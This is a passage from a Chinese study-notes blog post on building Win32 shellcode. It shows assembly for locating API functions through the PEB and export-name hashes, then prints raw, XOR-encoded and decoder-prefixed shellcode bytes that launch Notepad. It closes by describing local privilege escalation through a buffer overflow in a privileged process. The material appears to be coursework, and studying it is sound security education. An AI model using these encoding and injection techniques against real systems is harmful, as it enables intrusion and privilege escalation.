mov     ebx,eax ;   <span class="comment">// save the base to ebx;</span></span><br><span class="line">            call    get_function_addr;</span><br><span class="line">        end_of_findHashFuncAddrProc:</span><br><span class="line">            pop     edx;</span><br><span class="line">            pop     ecx;</span><br><span class="line">            pop     ebx;</span><br><span class="line">            pop     esi;</span><br><span class="line">            retn;</span><br><span class="line"></span><br><span class="line">        get_base_address:</span><br><span class="line">            mov     eax, fs:<span class="number">30</span>h     ; PEB base</span><br><span class="line">            mov     eax, [eax+<span class="number">0</span>ch]  ; PEB_LER_DATA</span><br><span class="line">            mov     eax,[eax+<span class="number">1</span>ch]   ; The first element of InInitOrderModuleList</span><br><span class="line">            mov     eax,[eax]       ; Next element</span><br><span class="line">            mov     eax,[eax+<span class="number">8</span>]     ; eax = Base address of the module</span><br><span class="line">            retn;</span><br><span class="line"></span><br><span class="line">        get_function_addr:</span><br><span class="line">            mov     eax,[ebx+<span class="number">3</span>ch]       ; e_lfanew</span><br><span class="line">            mov     eax,[eax+ebx+<span class="number">78</span>h]   ; DataDirectory[<span class="number">0</span>]</span><br><span class="line">            add     eax,ebx             ; RVA + base</span><br><span class="line">            mov     esi,eax             ; Save first DataDirectory to esi</span><br><span class="line">            mov     ecx,[esi+<span class="number">18</span>h]           ; NumberOfNames</span><br><span class="line">        compare_names_hash:</span><br><span class="line">            mov     eax, [esi+<span class="number">20</span>h]          ; AddressOfNames RVA</span><br><span class="line">            add     eax, ebx                ; rva2va</span><br><span class="line">            mov     eax, [eax+ecx*<span class="number">4</span><span class="number">-4</span>]      ; NamesAddress RVA</span><br><span class="line">            add     eax, ebx                ; rva2va, now eax store the address of the name</span><br><span class="line"></span><br><span class="line">            push    edi                     ; save edi to <span class="built_in">stack</span></span><br><span class="line">            mov     edi,eax                 ; put the address of the <span class="built_in">string</span> to edi</span><br><span class="line">            call    hash_proc;              ; gethash</span><br><span class="line">            pop     edi                     ; restor edi from <span class="built_in">stack</span></span><br><span class="line"></span><br><span class="line">            cmp     eax,edx;                ; compare to hash;</span><br><span class="line">            je      done_find_hash;</span><br><span class="line">        loop compare_names_hash;</span><br><span class="line">            xor     eax,eax;</span><br><span class="line">            jmp     done_get_function_addr;</span><br><span class="line">        done_find_hash:</span><br><span class="line">            mov     eax, [esi+<span class="number">1</span>ch]          ; AddressOfFunctions RVA</span><br><span class="line">            add     eax, ebx                ; rva2va</span><br><span class="line">            mov     eax, [eax+ecx*<span class="number">4</span><span class="number">-4</span>]      ; FunctionAddress RVA</span><br><span class="line">            add     eax, ebx                ; rva2va, now eax store the address of the Function</span><br><span class="line">        done_get_function_addr:</span><br><span class="line">            retn;</span><br><span class="line"></span><br><span class="line">        hash_proc:</span><br><span class="line">            <span class="comment">// save ebx,ecx,edx,edi</span></span><br><span class="line">            push    ebx         ;</span><br><span class="line">            push    ecx         ;</span><br><span class="line">            push    edx         ;</span><br><span class="line">            push    edi         ;</span><br><span class="line">            xor     edx,edx     ; edx = h</span><br><span class="line">        hash_loop:              ;</span><br><span class="line">            movsx   eax,byte ptr [edi]  ; [eax]=*c ==&gt; eax</span><br><span class="line">            cmp     eax,<span class="number">0</span>       ;</span><br><span class="line">            je  exit_hash_proc  ;</span><br><span class="line">            mov     ebx,edx     ; h ==&gt; ebx</span><br><span class="line">            mov     ecx,edx     ; h ==&gt; ecx</span><br><span class="line">            shl     ebx,<span class="number">19</span>h     ; h &lt;&lt; <span class="number">25</span></span><br><span class="line">            shr     ecx,<span class="number">7</span>       ; h &gt;&gt; <span class="number">7</span></span><br><span class="line">            or      ebx,ecx     ; ((h &lt;&lt; <span class="number">25</span>) | (h &gt;&gt; <span class="number">7</span>))</span><br><span class="line">            mov     edx,ebx     ;</span><br><span class="line">            add     edx,eax     ;</span><br><span class="line">            inc     edi;        ;</span><br><span class="line">            jmp hash_loop       ;</span><br><span class="line">        exit_hash_proc:         ;</span><br><span class="line">            mov     eax,edx     ; save hash to eax</span><br><span class="line">            <span class="comment">// restore ebx,ecx,edx,edi</span></span><br><span class="line">            pop     edi         ;</span><br><span class="line">            pop     edx         ;</span><br><span class="line">            pop     ecx         ;</span><br><span class="line">            pop     ebx         ;</span><br><span class="line">            retn                ;</span><br><span class="line">		end_of_this_function:</span><br><span class="line">    	    PROC_END;   <span class="comment">// End of the code</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    doCommandLineAsm();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    <code>cl /Zi do32CommandAsm.cpp &amp; do32CommandAsm.exe</code>编译运行，能正常打开记事本。</p>
<p>​    <strong>将do32commandAsm.exe中的核心代码提取出来并存放在字符串中，就得到了shellcode。</strong></p>
<p>​    1. 如果代码比较短小，用dumpbin.exe反汇编可执行文件的代码，指令如下：</p>
<p>​    <code>dumpbin do32CommandAsm.exe /disasm /section:.text &gt; dump.txt</code></p>
<p>​    注：<code>/disasm</code>指的是展示代码段的反汇编，将text段放到dump.txt里。</p>
<p><img src="/images/win32-shellcode/image-20221130135917783.png" alt="image-20221130135917783" style="zoom:67%;" /></p>
<p>​    2. 对于较长的代码可以用一个函数把操作码提取并打印出来（GetShellcode.cpp），实现该功能的代码如下：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/WD-2711/cybersecurity-code-PPT/blob/main/%E7%AC%AC11%E7%AB%A0/%E7%AC%AC11%E7%AB%A0%20Win32%20Shellcode%E6%BA%90%E4%BB%A3%E7%A0%81%20(1)/GetShellcode.cpp">https://github.com/WD-2711/cybersecurity-code-PPT/blob/main/%E7%AC%AC11%E7%AB%A0/%E7%AC%AC11%E7%AB%A0%20Win32%20Shellcode%E6%BA%90%E4%BB%A3%E7%A0%81%20(1)/GetShellcode.cpp</a></p>
<p>​    其中，PrintStrCode函数的作用是输出代码为字符串，GetProcOpcode函数的作用是获得shellcode目标代码的起始地址及长度，doCommandLineAsm就是我们把C程序编程汇编的shellcode汇编代码，以doCommandLineAsm的地址为输入参数，调用GetProcOpcode函数则可以得到二进制代码及长度。最终打印输出的位串，得到 shellcode 。</p>
<p><img src="/images/win32-shellcode/image-20221130141945507.png" alt="image-20221130141945507" style="zoom:50%;" /></p>
<p>​    最终编译运行<code>cl GetShellcode.cpp &amp; GetShellcode.exe</code>，获得shellcode：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原始二进制代码</span></span><br><span class="line"><span class="comment">/* 264=0x108 bytes */</span></span><br><span class="line"><span class="string">&quot;\x68\x65\x78\x65\x00\x68\x70\x61\x64\x2e\x68\x6e\x6f\x74\x65\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\xfc\x68\x57\x66\x0d\xff\x68\x63\x89\xd1\x4f\x68\xc9\xbc\xa6\x6b&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\xe8\x56\x00\x00\x00\x8b\xf0\x5a\xe8\x4e\x00\x00\x00\x8b\xd8&quot;</span></span><br><span class="line"><span class="string">&quot;\xe8\x05\x00\x00\x00\xe9\xce\x00\x00\x00\x51\x52\x56\x57\x55\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\xec\x8b\xd7\x83\xec\x54\x8b\xfc\x6a\x14\x59\x33\xc0\x89\x04\x8f&quot;</span></span><br><span class="line"><span class="string">&quot;\xe2\xfb\xc6\x47\x10\x44\x8d\x47\x10\x57\x50\x6a\x00\x6a\x00\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x00\x6a\x00\x52\x6a\x00\xff\xd6\x83\xf8\x00\x74&quot;</span></span><br><span class="line"><span class="string">&quot;\x03\x50\xff\xd3\x8b\xe5\x5d\x5f\x5e\x5a\x59\xc3\x56\x53\x51\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\xe8\x11\x00\x00\x00\x83\xf8\x00\x7e\x07\x8b\xd8\xe8\x17\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x5a\x59\x5b\x5e\xc3\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x1c\x8b\x00\x8b\x40\x08\xc3\x8b\x43\x3c\x8b\x44\x18\x78\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\xc3\x8b\xf0\x8b\x4e\x18\x8b\x46\x20\x03\xc3\x8b\x44\x88\xfc\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\xc3\x57\x8b\xf8\xe8\x17\x00\x00\x00\x5f\x3b\xc2\x74\x06\xe2\xe6&quot;</span></span><br><span class="line"><span class="string">&quot;\x33\xc0\xeb\x0b\x8b\x46\x1c\x03\xc3\x8b\x44\x88\xfc\x03\xc3\xc3&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x51\x52\x57\x33\xd2\x0f\xbe\x07\x83\xf8\x00\x74\x13\x8b\xda&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\xca\xc1\xe3\x19\xc1\xe9\x07\x0b\xd9\x8b\xd3\x03\xd0\x47\xeb&quot;</span></span><br><span class="line"><span class="string">&quot;\xe5\x8b\xc2\x5f\x5a\x59\x5b\xc3&quot;</span>;</span><br><span class="line"><span class="comment">// 找到xor字节并编码shellcode</span></span><br><span class="line">XorByte=<span class="number">0xfe</span></span><br><span class="line"><span class="comment">/* 264=0x108 bytes */</span></span><br><span class="line"><span class="string">&quot;\x96\x9b\x86\x9b\xfe\x96\x8e\x9f\x9a\xd0\x96\x90\x91\x8a\x9b\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\x02\x96\xa9\x98\xf3\x01\x96\x9d\x77\x2f\xb1\x96\x37\x42\x58\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xa4\x16\xa8\xfe\xfe\xfe\x75\x0e\xa4\x16\xb0\xfe\xfe\xfe\x75\x26&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\xfb\xfe\xfe\xfe\x17\x30\xfe\xfe\xfe\xaf\xac\xa8\xa9\xab\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\x12\x75\x29\x7d\x12\xaa\x75\x02\x94\xea\xa7\xcd\x3e\x77\xfa\x71&quot;</span></span><br><span class="line"><span class="string">&quot;\x1c\x05\x38\xb9\xee\xba\x73\xb9\xee\xa9\xae\x94\xfe\x94\xfe\x94&quot;</span></span><br><span class="line"><span class="string">&quot;\xfe\x94\xfe\x94\xfe\x94\xfe\xac\x94\xfe\x01\x28\x7d\x06\xfe\x8a&quot;</span></span><br><span class="line"><span class="string">&quot;\xfd\xae\x01\x2d\x75\x1b\xa3\xa1\xa0\xa4\xa7\x3d\xa8\xad\xaf\xac&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\xef\xfe\xfe\xfe\x7d\x06\xfe\x80\xf9\x75\x26\x16\xe9\xfe\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\xfe\xa4\xa7\xa5\xa0\x3d\x9a\x5f\xce\xfe\xfe\xfe\x75\xbe\xf2\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xbe\xe2\x75\xfe\x75\xbe\xf6\x3d\x75\xbd\xc2\x75\xba\xe6\x86\xfd&quot;</span></span><br><span class="line"><span class="string">&quot;\x3d\x75\x0e\x75\xb0\xe6\x75\xb8\xde\xfd\x3d\x75\xba\x76\x02\xfd&quot;</span></span><br><span class="line"><span class="string">&quot;\x3d\xa9\x75\x06\x16\xe9\xfe\xfe\xfe\xa1\xc5\x3c\x8a\xf8\x1c\x18&quot;</span></span><br><span class="line"><span class="string">&quot;\xcd\x3e\x15\xf5\x75\xb8\xe2\xfd\x3d\x75\xba\x76\x02\xfd\x3d\x3d&quot;</span></span><br><span class="line"><span class="string">&quot;\xad\xaf\xac\xa9\xcd\x2c\xf1\x40\xf9\x7d\x06\xfe\x8a\xed\x75\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x34\x3f\x1d\xe7\x3f\x17\xf9\xf5\x27\x75\x2d\xfd\x2e\xb9\x15&quot;</span></span><br><span class="line"><span class="string">&quot;\x1b\x75\x3c\xa1\xa4\xa7\xa5\x3d&quot;</span>;</span><br><span class="line">Success: encode is OK</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对shellcode进行解码</span></span><br><span class="line">length of shellcode = <span class="number">287</span> = <span class="number">0x11f</span></span><br><span class="line"><span class="comment">/* 287=0x11f bytes */</span></span><br><span class="line"><span class="string">&quot;\xeb\x10\x5b\x53\x4b\x33\xc9\x66\xb9\x08\x01\x80\x34\x0b\xfe\xe2&quot;</span></span><br><span class="line"><span class="string">&quot;\xfa\xc3\xe8\xeb\xff\xff\xff\x96\x9b\x86\x9b\xfe\x96\x8e\x9f\x9a&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x96\x90\x91\x8a\x9b\x75\x02\x96\xa9\x98\xf3\x01\x96\x9d\x77&quot;</span></span><br><span class="line"><span class="string">&quot;\x2f\xb1\x96\x37\x42\x58\x95\xa4\x16\xa8\xfe\xfe\xfe\x75\x0e\xa4&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\xb0\xfe\xfe\xfe\x75\x26\x16\xfb\xfe\xfe\xfe\x17\x30\xfe\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\xfe\xaf\xac\xa8\xa9\xab\x75\x12\x75\x29\x7d\x12\xaa\x75\x02\x94&quot;</span></span><br><span class="line"><span class="string">&quot;\xea\xa7\xcd\x3e\x77\xfa\x71\x1c\x05\x38\xb9\xee\xba\x73\xb9\xee&quot;</span></span><br><span class="line"><span class="string">&quot;\xa9\xae\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94\xfe\xac\x94&quot;</span></span><br><span class="line"><span class="string">&quot;\xfe\x01\x28\x7d\x06\xfe\x8a\xfd\xae\x01\x2d\x75\x1b\xa3\xa1\xa0&quot;</span></span><br><span class="line"><span class="string">&quot;\xa4\xa7\x3d\xa8\xad\xaf\xac\x16\xef\xfe\xfe\xfe\x7d\x06\xfe\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\xf9\x75\x26\x16\xe9\xfe\xfe\xfe\xa4\xa7\xa5\xa0\x3d\x9a\x5f\xce&quot;</span></span><br><span class="line"><span class="string">&quot;\xfe\xfe\xfe\x75\xbe\xf2\x75\xbe\xe2\x75\xfe\x75\xbe\xf6\x3d\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xbd\xc2\x75\xba\xe6\x86\xfd\x3d\x75\x0e\x75\xb0\xe6\x75\xb8\xde&quot;</span></span><br><span class="line"><span class="string">&quot;\xfd\x3d\x75\xba\x76\x02\xfd\x3d\xa9\x75\x06\x16\xe9\xfe\xfe\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\xa1\xc5\x3c\x8a\xf8\x1c\x18\xcd\x3e\x15\xf5\x75\xb8\xe2\xfd\x3d&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xba\x76\x02\xfd\x3d\x3d\xad\xaf\xac\xa9\xcd\x2c\xf1\x40\xf9&quot;</span></span><br><span class="line"><span class="string">&quot;\x7d\x06\xfe\x8a\xed\x75\x24\x75\x34\x3f\x1d\xe7\x3f\x17\xf9\xf5&quot;</span></span><br><span class="line"><span class="string">&quot;\x27\x75\x2d\xfd\x2e\xb9\x15\x1b\x75\x3c\xa1\xa4\xa7\xa5\x3d&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>​    注意，由于<strong>原始二进制代码（上述第一个shellcode）</strong>的shellcode中存在字符串结束符<code>\0</code>，无法通过strcpy将其复制到被攻击的缓冲区，因此要对shellcode重新编码，使其不包含<code>\0</code>。</p>
<p>​    为简单起见，常用异或操作实现shellcode的编码。为此先找到用于异或的字节 (编码字节) ，然后对shellcode的所有字节与编码字节进行异或操作，则去掉了字符串结束符 <code>\0</code>。</p>
<p>​    GetShellcode.cpp中的2个函数分别实现编码字节的查找和实现shellcode的编码：findXorByte与EncOpcode，他们会得出<strong>编码后的shellcode（上述第2个shellcode）</strong>。</p>
<p>​    编码后的shellcode需要在目标进程中解码后才能执行，为此需要将解码程序附加在其之前，构建新的shellcode，如下图所示：</p>
<p><img src="/images/win32-shellcode/image-20221130143609603.png" alt="image-20221130143609603" style="zoom:50%;" /></p>
<p><img src="/images/win32-shellcode/image-20221130143651501.png" alt="image-20221130143651501" style="zoom:44%;" /></p>
<p><img src="/images/win32-shellcode/image-20221130143754762.png" alt="image-20221130143754762" style="zoom:50%;" /></p>
<p>​    设计出满足特定功能的shellcode之后，就可以尝试攻击Windows进程的缓冲区溢出漏洞。</p>
<p>​    一般而言，如果在编译程序的时候<strong>打开了堆栈的安全检查功能或者不允许栈执行</strong>，则无法在有栈溢出漏洞的进程中执行shellcode。此时可以尝试其他的攻击方法，比如<strong>堆溢出、格式化字符串等攻击</strong>。</p>
<p>​    <strong>补充：</strong></p>
<ol>
<li><p>格式化字符串</p>
<p><a target="_blank" rel="noopener" href="https://sec.mrfan.xyz/2018/10/23/%E3%80%90%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/">https://sec.mrfan.xyz/2018/10/23/%E3%80%90%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/</a></p>
</li>
<li><p>堆溢出</p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heapoverflow-basic/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heapoverflow-basic/</a></p>
</li>
</ol>
<h2 id="0x05-shellcode本地攻击"><a href="#0x05-shellcode本地攻击" class="headerlink" title="0x05 shellcode本地攻击"></a>0x05 shellcode本地攻击</h2><p>​    登录到系统中的普通权限用户可以通过攻击某个具有( Administators 组的用或Administrator 用户）Administrator或system (服务进程具有的权限) 权限的进程以试图提升用户的权限，或控制目标系统。</p>
<p>​    如果进程从文件中读数据或从环境中获得数据，且存在溢出漏洞则有可能执行shellcode。</p>
<p>​    <strong>如果进程从终端获取用户的输入，尤其是要求输入字符串，则很难执行shellcode。这是因为shellcode中有大量的不可显示的字符用户很难以字符的形式输入到缓冲区。</strong></p>
<p><img src="/images/win32-shellcode/image-20221130144851519.png" alt="image-20221130144851519" style="zoom:67%;" /></p>
<p>​    假定remoter通过远程桌面登录到系统，fanping通过控制台登录到系统。</p>
<p>​    我们假定remoter运行一个存在溢出漏洞的进程从文件中读入数据，而该文件是普通则权限用户可写的，普通用户fanping可精心组织文件的内容而实现攻击。</p>
<p><img src="/images/win32-shellcode/image-20221130145205697.png" alt="image-20221130145205697" style="zoom:80%;" /></p>
<p>​    w32Lvictim.cpp完整代码在：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/WD-2711/cybersecurity-code-PPT/blob/main/%E7%AC%AC11%E7%AB%A0/%E7%AC%AC11%E7%AB%A0%20Win32%20Shellcode%E6%BA%90%E4%BB%A3%E7%A0%81%20(1)/w32Lvictim.cpp">https://github.com/WD-2711/cybersecurity-code-PPT/blob/main/%E7%AC%AC11%E7%AB%A0/%E7%AC%AC11%E7%AB%A0%20Win32%20Shellcode%E6%BA%90%E4%BB%A3%E7%A0%81%20(1)/w32Lvictim.cpp</a></p>
<p>​    之后的内容见PPT：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/WD-2711/cybersecurity-code-PPT/blob/main/%E7%AC%AC11%E7%AB%A0/%E7%AC%AC11%E7%AB%A0%20Win32%20Shellcode.pdf">https://github.com/WD-2711/cybersecurity-code-PPT/blob/main/%E7%AC%AC11%E7%AB%A0/%E7%AC%AC11%E7%AB%A0%20Win32%20Shellcode.pdf</a></p>

  
	</div>

	<div>
  	<center>
	<div class="pagination">

    
    
    <a href="/2022/11/30/win32-shellcode-homework/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2022/11/27/recentlyThink/" type="button" class="btn btn-default ">下一页<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>

    </center>
	</div>


	<!-- comment -->
	
<section id="comment">
    <h2 class="title">留言</h2>

    <!-- 
    <div id="disqus_thread" class="ds-thread">
        <script type="text/javascript">
            /**
             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
             */
                /*
                 var disqus_config = function () {
                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
                 };
                 */
            (function() { // DON'T EDIT BELOW THIS LINE
                var d = document, s = d.createElement('script');

                s.src = 'https://https-wd-2711-tech.disqus.com/embed.js';

                s.setAttribute('data-timestamp', +new Date());
                (d.head || d.body).appendChild(s);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
                Disqus.</a></noscript>
    </div> -->
    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
    <div id="vcomments"></div>
    <script>
        new Valine({
            el: '#vcomments',
            appId: 'wLIJ70s3fPvW8WJPgVVAuWVR-gzGzoHsz',
            appKey: 'NVGqxhUkqtFv2CbwmXXWjCdR'
        })
    </script>

    
</section>


	</div> <!-- col-md-9/col-md-12 -->
		
	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2022-11-29 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/study-notes/">study-notes<span>17</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

	</div>

	<!-- copyright -->
	<div>
    <ul class="post-copyright">
      <li class="post-copyright-author">
      <strong>作者:  </strong>wd-z711</a>
      </li>
      <li class="post-copyright-link">
      <strong>文章链接:  </strong>
      <a href="/" target="_blank" title="">https://wd-2711.tech/</a>
      </li>
      <li class="post-copyright-license">
        <strong>版权声明:   </strong>
        本博客所有文章除特别声明外，均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
        许可协议。转载请注明出处!
      </li>
    </ul>
  <div>
 	

		


</div><!-- row -->




	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  &copy; 2023 wd-z711
  
      <!-- with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
     <br> Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.     -->

     <!-- <script type="text/javascript">
      (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
      (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
      e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
      })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
      
      _st('install','aB-vgeB8gEDrnRJuhceL','2.0.0');
    </script> -->
    </p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</body>
   </html>
